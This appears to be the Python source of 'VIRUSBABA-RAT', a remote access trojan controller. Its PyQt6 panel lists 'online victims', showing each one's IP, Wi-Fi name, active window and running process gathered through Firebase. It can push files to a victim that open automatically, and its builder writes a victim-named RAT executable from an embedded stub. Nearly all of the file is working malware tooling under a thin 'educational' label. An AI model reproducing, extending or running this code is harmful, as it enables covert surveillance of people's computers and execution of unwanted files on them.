import sys
import os
import json
import base64
import time
import webbrowser
from datetime import datetime
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

import firebase_admin
from firebase_admin import credentials, firestore, storage

EMBEDDED_PAYLOAD_B64 = "PLACEHOLDER_BASE64_STRING"
CONFIG_FILE = "firebase_config.json"

# ============================================
# DARK THEME
# ============================================
STYLE = """
QMainWindow { background: #0d1117; }
QDialog { background: #0d1117; }
QWidget { background: transparent; color: #e6edf3; font-family: 'Segoe UI', Arial, sans-serif; font-size: 13px; }
QTabWidget::pane { border: 1px solid #30363d; border-radius: 12px; background: #0d1117; padding: 5px; }
QTabBar::tab { background: #161b22; color: #8b949e; padding: 10px 20px; margin: 2px; border: 1px solid #30363d; border-bottom: none; border-top-left-radius: 8px; border-top-right-radius: 8px; font-weight: bold; }
QTabBar::tab:selected { background: #0d1117; color: #58a6ff; border-bottom: 2px solid #58a6ff; }
QTabBar::tab:hover { background: #21262d; }
QPushButton { background: #238636; border: none; border-radius: 8px; padding: 8px 18px; font-weight: bold; color: #ffffff; }
QPushButton:hover { background: #2ea043; }
QPushButton:pressed { background: #1a5a2a; }
QPushButton#danger { background: #da3633; }
QPushButton#danger:hover { background: #f85149; }
QPushButton#sidebar { background: transparent; color: #e6edf3; text-align: left; padding: 10px 14px; border-radius: 8px; border: 1px solid transparent; }
QPushButton#sidebar:hover { background: #21262d; border: 1px solid #30363d; }
QPushButton#sidebar:checked { background: #1c2333; border-left: 4px solid #58a6ff; color: #58a6ff; }
QLineEdit, QTextEdit, QListWidget { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 6px 10px; color: #e6edf3; }
QLineEdit:focus, QTextEdit:focus, QListWidget:focus { border: 2px solid #58a6ff; }
QLabel#info { background: #161b22; border-radius: 10px; padding: 12px; border: 1px solid #30363d; }
QStatusBar { background: #161b22; color: #8b949e; border-top: 1px solid #30363d; }
QListWidget::item { background: #0d1117; border-radius: 6px; padding: 4px; margin: 1px; color: #e6edf3; }
QListWidget::item:selected { background: #1c2333; color: #58a6ff; }
QScrollBar:vertical { background: #161b22; width: 10px; border-radius: 5px; }
QScrollBar::handle:vertical { background: #30363d; border-radius: 5px; }
QScrollBar::handle:vertical:hover { background: #484f58; }
"""

# ============================================
# LOGIN WINDOW
# ============================================
class LoginWindow(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("VIRUSBABA-RAT - Login")
        self.setFixedSize(460, 340)
        self.setStyleSheet(STYLE)

        layout = QVBoxLayout()
        layout.setSpacing(18)
        layout.setContentsMargins(50, 50, 50, 50)

        title = QLabel("☣️ VIRUSBABA-RAT")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("font-size: 28px; font-weight: bold; color: #58a6ff;")
        layout.addWidget(title)

        subtitle = QLabel("Remote Administration Toolkit v3.0")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("font-size: 14px; color: #8b949e; margin-bottom: 10px;")
        layout.addWidget(subtitle)

        self.username_input = QLineEdit()
        self.username_input.setText("admin")
        self.username_input.setPlaceholderText("Username")
        self.username_input.setMinimumHeight(38)
        layout.addWidget(self.username_input)

        self.password_input = QLineEdit()
        self.password_input.setText("admin")
        self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.password_input.setPlaceholderText("Password")
        self.password_input.setMinimumHeight(38)
        layout.addWidget(self.password_input)

        self.login_btn = QPushButton("🔐 Access Panel")
        self.login_btn.setMinimumHeight(44)
        self.login_btn.clicked.connect(self.check_login)
        layout.addWidget(self.login_btn)

        self.status_label = QLabel("")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setStyleSheet("color: #f85149; font-size: 12px;")
        layout.addWidget(self.status_label)

        self.setLayout(layout)

    def check_login(self):
        if self.username_input.text() == "admin" and self.password_input.text() == "admin":
            self.accept()
        else:
            self.status_label.setText("❌ Invalid credentials")


# ============================================
# ABOUT TAB
# ============================================
class AboutTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.setSpacing(20)

        title = QLabel("☣️ VIRUSBABA-RAT")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("font-size: 32px; font-weight: bold; color: #58a6ff;")
        layout.addWidget(title)

        desc = QLabel("Remote Administration Toolkit\nFor Educational & Research Purposes Only")
        desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        desc.setStyleSheet("font-size: 16px; color: #8b949e;")
        layout.addWidget(desc)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("background: #30363d;")
        layout.addWidget(line)

        info_box = QGroupBox("📌 Contact & Information")
        info_box.setStyleSheet("""
            QGroupBox {
                border: 1px solid #30363d;
                border-radius: 10px;
                padding: 20px;
                font-weight: bold;
            }
            QGroupBox::title {
                color: #58a6ff;
            }
        """)
        info_layout = QVBoxLayout()
        info_layout.setSpacing(10)

        name_label = QLabel("👤 Name: VIRUSBABA")
        name_label.setStyleSheet("font-size: 14px;")
        info_layout.addWidget(name_label)

        purpose_label = QLabel("📚 Purpose: Educational & Research")
        purpose_label.setStyleSheet("font-size: 14px;")
        info_layout.addWidget(purpose_label)

        linkedin_btn = QPushButton("🔗 Connect on LinkedIn")
        linkedin_btn.setStyleSheet("""
            QPushButton {
                background: #0a66c2;
                border: none;
                border-radius: 8px;
                padding: 10px 20px;
                font-weight: bold;
                color: #ffffff;
                font-size: 14px;
            }
            QPushButton:hover {
                background: #1a76d2;
            }
        """)
        linkedin_btn.clicked.connect(lambda: webbrowser.open("https://www.linkedin.com/in/muhammad-subhan-28a638327"))
        info_layout.addWidget(linkedin_btn)

        info_box.setLayout(info_layout)
        layout.addWidget(info_box)

        footer = QLabel("© 2026 VIRUSBABA-RAT | All Rights Reserved")
        footer.setAlignment(Qt.AlignmentFlag.AlignCenter)
        footer.setStyleSheet("color: #484f58; font-size: 12px;")
        layout.addWidget(footer)

        layout.addStretch()
        self.setLayout(layout)


# ============================================
# MAIN CONTROLLER (Minimal)
# ============================================
class MainController(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("VIRUSBABA-RAT - Panel")
        self.setGeometry(50, 50, 1200, 750)
        self.setStyleSheet(STYLE)

        self.firebase_creds = ""
        self.firebase_app = None
        self.db = None
        self.bucket = None
        self.devices = {}
        self.current_victim = None
        self.auto_refresh_timer = None

        self.load_config()
        self.init_ui()
        self.init_firebase()

    def init_ui(self):
        tabs = QTabWidget()

        # --- DASHBOARD TAB ---
        self.dashboard_tab = QWidget()
        main_layout = QHBoxLayout(self.dashboard_tab)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Left Sidebar
        sidebar_widget = QWidget()
        sidebar_widget.setFixedWidth(280)
        sidebar_widget.setStyleSheet("background: #161b22; border-right: 1px solid #30363d;")
        sidebar_layout = QVBoxLayout(sidebar_widget)
        sidebar_layout.setContentsMargins(10, 15, 10, 15)
        sidebar_layout.setSpacing(5)

        sidebar_label = QLabel("☣️ Online Victims")
        sidebar_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #58a6ff; padding: 5px;")
        sidebar_layout.addWidget(sidebar_label)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        scroll_widget = QWidget()
        self.sidebar_btn_layout = QVBoxLayout(scroll_widget)
        self.sidebar_btn_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        self.sidebar_btn_layout.setSpacing(3)
        scroll_area.setWidget(scroll_widget)
        sidebar_layout.addWidget(scroll_area)

        refresh_btn = QPushButton("🔄 Refresh List")
        refresh_btn.clicked.connect(self.refresh_dashboard)
        sidebar_layout.addWidget(refresh_btn)

        self.sidebar_status = QLabel("Click 'Refresh List' to load.")
        self.sidebar_status.setStyleSheet("color: #8b949e; padding: 5px;")
        sidebar_layout.addWidget(self.sidebar_status)

        # Right Details Panel
        details_widget = QWidget()
        details_layout = QVBoxLayout(details_widget)
        details_layout.setContentsMargins(25, 25, 25, 25)
        details_layout.setSpacing(15)

        self.victim_header = QLabel("Select a victim")
        self.victim_header.setStyleSheet("font-size: 22px; font-weight: bold; color: #58a6ff;")
        details_layout.addWidget(self.victim_header)

        # Info Grid
        info_grid = QGridLayout()
        info_grid.setSpacing(10)
        self.name_label = QLabel("Victim: -")
        self.pc_label = QLabel("PC: -")
        self.ip_label = QLabel("IP: -")
        self.wifi_label = QLabel("Wi-Fi: -")
        self.resources_label = QLabel("CPU: - | RAM: - | Disk: - | Battery: -")

        for lbl in [self.name_label, self.pc_label, self.ip_label, self.wifi_label, self.resources_label]:
            lbl.setObjectName("info")

        info_grid.addWidget(self.name_label, 0, 0)
        info_grid.addWidget(self.pc_label, 0, 1)
        info_grid.addWidget(self.ip_label, 0, 2)
        info_grid.addWidget(self.wifi_label, 1, 0, 1, 2)
        info_grid.addWidget(self.resources_label, 1, 2)
        details_layout.addLayout(info_grid)

        # --- ONLY ONE ACTION BUTTON: SEND FILE ---
        action_layout = QHBoxLayout()
        self.send_file_btn = QPushButton("📤 Send File")
        self.send_file_btn.clicked.connect(self.send_file_to_selected)
        action_layout.addWidget(self.send_file_btn)
        details_layout.addLayout(action_layout)

        self.file_status = QLabel("")
        self.file_status.setStyleSheet("padding: 5px; background: #161b22; border-radius: 6px; border: 1px solid #30363d;")
        details_layout.addWidget(self.file_status)

        details_layout.addWidget(QLabel("Recent Activity:"))
        self.activity_log = QListWidget()
        self.activity_log.setMinimumHeight(150)
        details_layout.addWidget(self.activity_log)

        main_layout.addWidget(sidebar_widget)
        main_layout.addWidget(details_widget, 1)

        self.dashboard_tab.setLayout(main_layout)
        tabs.addTab(self.dashboard_tab, "📡 Dashboard")

        # --- FIREBASE TAB ---
        self.firebase_tab = QWidget()
        layout2 = QVBoxLayout()
        layout2.addWidget(QLabel("Paste your serviceAccountKey.json:"))
        self.firebase_text = QTextEdit()
        if self.firebase_creds:
            self.firebase_text.setText(self.firebase_creds)
        self.firebase_text.setMinimumHeight(200)
        layout2.addWidget(self.firebase_text)
        btn_layout2 = QHBoxLayout()
        self.save_btn = QPushButton("💾 Save")
        self.save_btn.clicked.connect(self.save_config)
        self.test_btn = QPushButton("🔗 Test")
        self.test_btn.clicked.connect(self.test_connection)
        btn_layout2.addWidget(self.save_btn)
        btn_layout2.addWidget(self.test_btn)
        layout2.addLayout(btn_layout2)
        self.firebase_status = QLabel("Status: Ready")
        layout2.addWidget(self.firebase_status)
        self.firebase_tab.setLayout(layout2)
        tabs.addTab(self.firebase_tab, "⚙️ Firebase")

        # --- BUILDER TAB ---
        self.builder_tab = QWidget()
        layout3 = QVBoxLayout()
        layout3.addWidget(QLabel("Victim Name:"))
        self.victim_name_input = QLineEdit()
        self.victim_name_input.setPlaceholderText("e.g., Target-PC")
        layout3.addWidget(self.victim_name_input)

        layout3.addWidget(QLabel("Output Folder:"))
        folder_layout = QHBoxLayout()
        self.folder_path = QLineEdit()
        self.folder_path.setReadOnly(True)
        self.folder_path.setText(os.path.expanduser("~\\Desktop"))
        self.browse_btn = QPushButton("Browse...")
        self.browse_btn.clicked.connect(self.browse_folder)
        folder_layout.addWidget(self.folder_path)
        folder_layout.addWidget(self.browse_btn)
        layout3.addLayout(folder_layout)

        self.generate_btn = QPushButton("🔥 Generate RAT")
        self.generate_btn.setObjectName("danger")
        self.generate_btn.clicked.connect(self.generate_payload)
        layout3.addWidget(self.generate_btn)

        self.builder_status = QLabel("Status: Waiting")
        self.builder_status.setStyleSheet("padding: 6px; background: #161b22; border-radius: 6px; border: 1px solid #30363d;")
        layout3.addWidget(self.builder_status)

        layout3.addWidget(QLabel("Build Log:"))
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setMinimumHeight(100)
        layout3.addWidget(self.log_area)

        self.builder_tab.setLayout(layout3)
        tabs.addTab(self.builder_tab, "🚀 Builder")

        # --- ABOUT TAB ---
        self.about_tab = AboutTab()
        tabs.addTab(self.about_tab, "ℹ️ About")

        self.setCentralWidget(tabs)
        self.statusBar().showMessage("VIRUSBABA-RAT Ready | Firebase: Not connected")

        self.start_auto_refresh()

    def start_auto_refresh(self):
        if self.auto_refresh_timer:
            self.auto_refresh_timer.stop()
        self.auto_refresh_timer = QTimer()
        self.auto_refresh_timer.timeout.connect(self.refresh_dashboard)
        self.auto_refresh_timer.start(10000)

    # ============================================
    # FIREBASE HELPERS
    # ============================================
    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                data = json.load(f)
                self.firebase_creds = data.get('creds', '')

    def save_config(self):
        text = self.firebase_text.toPlainText().strip()
        if not text:
            self.firebase_status.setText("❌ Empty config.")
            return
        try:
            json.loads(text)
            with open(CONFIG_FILE, 'w') as f:
                json.dump({"creds": text}, f)
            self.firebase_creds = text
            self.firebase_status.setText("✅ Config saved.")
            self.init_firebase()
        except Exception as e:
            self.firebase_status.setText(f"❌ Invalid JSON: {str(e)}")

    def init_firebase(self):
        if not self.firebase_creds:
            return
        try:
            if self.firebase_app:
                firebase_admin.delete_app(self.firebase_app)
            cred_dict = json.loads(self.firebase_creds)
            cred = credentials.Certificate(cred_dict)
            self.firebase_app = firebase_admin.initialize_app(cred, {
                'storageBucket': cred_dict.get('project_id') + '.appspot.com'
            })
            self.db = firestore.client()
            self.bucket = storage.bucket()
            self.firebase_status.setText("✅ Firebase connected.")
            self.statusBar().showMessage("VIRUSBABA-RAT Ready | Firebase: Connected")
            self.refresh_dashboard()
        except Exception as e:
            self.firebase_status.setText(f"❌ Error: {str(e)}")

    def test_connection(self):
        self.save_config()
        if not self.db:
            self.firebase_status.setText("❌ Not initialized.")
            return
        try:
            self.db.collection("telemetry").limit(1).get()
            self.firebase_status.setText("✅ Connection OK.")
        except Exception as e:
            self.firebase_status.setText(f"❌ Failed: {str(e)}")

    # ============================================
    # VICTIM FETCH
    # ============================================
    def refresh_dashboard(self):
        if not self.db:
            self.sidebar_status.setText("⚠️ Firebase not connected.")
            return

        self.sidebar_status.setText("⏳ Fetching...")
        try:
            docs = self.db.collection("telemetry").limit(300).get()
            devices = {}
            for doc in docs:
                data = doc.to_dict()
                victim_id = data.get('child_id')
                ts = data.get('timestamp')
                if victim_id:
                    if victim_id not in devices or (ts and ts > devices[victim_id]['last']):
                        devices[victim_id] = {
                            'last': ts if ts else 0,
                            'pc_name': data.get('pc_name', 'Unknown'),
                            'public_ip': data.get('public_ip', 'Unknown'),
                            'wifi_ssid': data.get('wifi_ssid', 'Unknown'),
                            'window': data.get('window', 'Unknown'),
                            'process': data.get('process', 'Unknown'),
                            'cpu': data.get('cpu', 0),
                            'ram': data.get('ram', 0),
                            'disk': data.get('disk', 0),
                            'battery': data.get('battery', -1),
                        }
            self.devices = devices
            self.update_sidebar()
        except Exception as e:
            self.sidebar_status.setText(f"❌ Error: {str(e)}")

    def update_sidebar(self):
        for i in reversed(range(self.sidebar_btn_layout.count())):
            widget = self.sidebar_btn_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

        if not self.devices:
            self.sidebar_status.setText("No victims found.")
            return

        now = time.time()
        online_count = 0

        for victim_id, info in self.devices.items():
            last_seen = info['last']
            try:
                if hasattr(last_seen, 'timestamp'):
                    last_ts = last_seen.timestamp()
                elif hasattr(last_seen, 'seconds'):
                    last_ts = last_seen.seconds
                elif isinstance(last_seen, (int, float)):
                    last_ts = last_seen
                else:
                    last_ts = 0
            except:
                last_ts = 0

            if last_ts <= 0 or (now - last_ts) >= 120:
                continue

            online_count += 1
            btn = QPushButton(f"🟢 {victim_id} ({info['pc_name']})")
            btn.setObjectName("sidebar")
            btn.setCheckable(True)
            btn.clicked.connect(lambda checked, vid=victim_id: self.select_victim(vid))
            self.sidebar_btn_layout.addWidget(btn)

        self.sidebar_status.setText(f"🟢 Online: {online_count}")
        self.statusBar().showMessage(f"Online victims: {online_count}")

        if online_count > 0 and not self.current_victim:
            first = list(self.devices.keys())[0]
            self.select_victim(first)
        elif self.current_victim and self.current_victim in self.devices:
            self.select_victim(self.current_victim)

    def select_victim(self, victim_id):
        self.current_victim = victim_id
        info = self.devices.get(victim_id)
        if not info:
            return

        for i in range(self.sidebar_btn_layout.count()):
            btn = self.sidebar_btn_layout.itemAt(i).widget()
            if btn:
                btn.setChecked(btn.text().find(victim_id) != -1)

        self.victim_header.setText(f"☣️ {victim_id} ({info['pc_name']})")
        self.name_label.setText(f"Victim: {victim_id}")
        self.pc_label.setText(f"PC: {info['pc_name']}")
        self.ip_label.setText(f"IP: {info['public_ip']}")
        self.wifi_label.setText(f"Wi-Fi: {info.get('wifi_ssid', 'Unknown')}")
        self.resources_label.setText(f"CPU: {info.get('cpu',0)}% | RAM: {info.get('ram',0)}% | Disk: {info.get('disk',0)}% | Battery: {info.get('battery',-1)}%")

        self.refresh_selected_details()

    def refresh_selected_details(self):
        if not self.db or not self.current_victim:
            return
        self.activity_log.clear()
        try:
            docs = self.db.collection("telemetry")\
                .where("child_id", "==", self.current_victim)\
                .limit(50)\
                .get()
            items = []
            for doc in docs:
                data = doc.to_dict()
                ts = data.get('timestamp')
                window = data.get('window', 'Unknown')
                process = data.get('process', 'Unknown')
                if ts and hasattr(ts, 'seconds'):
                    dt = datetime.fromtimestamp(ts.seconds).strftime('%H:%M:%S')
                else:
                    dt = "Unknown"
                items.append((dt, window, process))
            items.sort(key=lambda x: x[0], reverse=True)
            for dt, window, process in items[:50]:
                self.activity_log.addItem(f"[{dt}] {window} ({process})")
            if not items:
                self.activity_log.addItem("No pings yet.")
        except Exception as e:
            self.activity_log.addItem(f"Error: {str(e)}")

    # ============================================
    # SEND FILE (The Only Action)
    # ============================================
    def send_file_to_selected(self):
        if not self.current_victim:
            self.file_status.setText("❌ No victim selected.")
            return
        if not self.db or not self.bucket:
            self.file_status.setText("❌ Firebase not ready.")
            return

        file_path, _ = QFileDialog.getOpenFileName(self, "Select file to send")
        if not file_path:
            return

        try:
            self.file_status.setText("⏳ Uploading...")
            blob_name = f"files/{self.current_victim}/{int(time.time())}_{os.path.basename(file_path)}"
            blob = self.bucket.blob(blob_name)
            blob.upload_from_filename(file_path)
            blob.make_public()
            url = blob.public_url

            self.db.collection("commands").add({
                "child_id": self.current_victim,
                "type": "open_file",
                "file_url": url,
                "file_name": os.path.basename(file_path),
                "status": "pending",
                "timestamp": firestore.SERVER_TIMESTAMP
            })
            self.file_status.setText(f"✅ File sent to {self.current_victim}. It will open automatically on their PC.")
        except Exception as e:
            self.file_status.setText(f"❌ Error: {str(e)}")

    # ============================================
    # PAYLOAD BUILDER
    # ============================================
    def browse_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Select Output Folder")
        if folder:
            self.folder_path.setText(folder)

    def generate_payload(self):
        victim_name = self.victim_name_input.text().strip()
        if not victim_name:
            self.builder_status.setText("❌ Enter a name.")
            return

        output_folder = self.folder_path.text().strip()
        if not os.path.exists(output_folder):
            self.builder_status.setText("❌ Folder does not exist.")
            return

        if not self.firebase_creds:
            self.builder_status.setText("❌ Firebase config missing.")
            return

        if EMBEDDED_PAYLOAD_B64.startswith("PLACEHOLDER") or len(EMBEDDED_PAYLOAD_B64) < 1000:
            self.builder_status.setText("❌ Payload stub not embedded.")
            self.log_area.append("❌ Stub missing. Rebuild controller.")
            return

        try:
            self.builder_status.setText("⏳ Generating...")
            self.log_area.append(f"☣️ Building {victim_name}")

            stub_bytes = base64.b64decode(EMBEDDED_PAYLOAD_B64)
            config = {
                "child_id": victim_name,
                "firebase_creds": self.firebase_creds
            }
            config_json = json.dumps(config).encode('utf-8')

            output_path = os.path.join(output_folder, f"{victim_name}_RAT.exe")
            with open(output_path, "wb") as f:
                f.write(stub_bytes)
                f.write(b'--PAYLOAD-CONFIG--')
                f.write(config_json)

            self.builder_status.setText(f"✅ Saved to {output_path}")
            self.log_area.append(f"✅ RAT created: {output_path}")
            self.statusBar().showMessage("RAT generated successfully!")
        except Exception as e:
            self.builder_status.setText(f"❌ Failed: {str(e)}")
            self.log_area.append(f"❌ {str(e)}")


# ============================================
# ENTRY
# ============================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    login = LoginWindow()
    if login.exec() == QDialog.DialogCode.Accepted:
        window = MainController()
        window.show()
        sys.exit(app.exec())
    else:
        sys.exit()